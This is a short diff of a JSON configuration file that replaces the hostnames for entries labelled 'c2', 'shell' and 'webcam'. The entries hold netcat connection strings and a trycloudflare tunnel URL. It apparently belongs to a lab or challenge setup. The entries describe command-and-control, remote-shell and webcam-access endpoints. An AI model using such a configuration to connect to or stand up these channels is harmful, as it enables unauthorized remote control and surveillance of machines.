@@ -1,18 +1,18 @@
 {
   "c2": {
-    "host": "strange-griffin-thinkpad-somerset",
+    "host": "sb-snap-show-retain",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc strange-griffin-thinkpad-somerset:"
+    "connection_string": "nc sb-snap-show-retain:"
   },
   "shell": {
-    "host": "forecast-blocked-carolina-hydrocodone",
+    "host": "locked-announces-seeing-she",
     "port": "",
     "type": "tcp",
-    "connection_string": "nc forecast-blocked-carolina-hydrocodone:"
+    "connection_string": "nc locked-announces-seeing-she:"
   },
   "webcam": {
-    "url": "https://ecommerce-immediate-casting-kept.trycloudflare.com",
+    "url": "https://conditional-judgment-butler-graduated.trycloudflare.com",
     "type": "http"
   }
 }
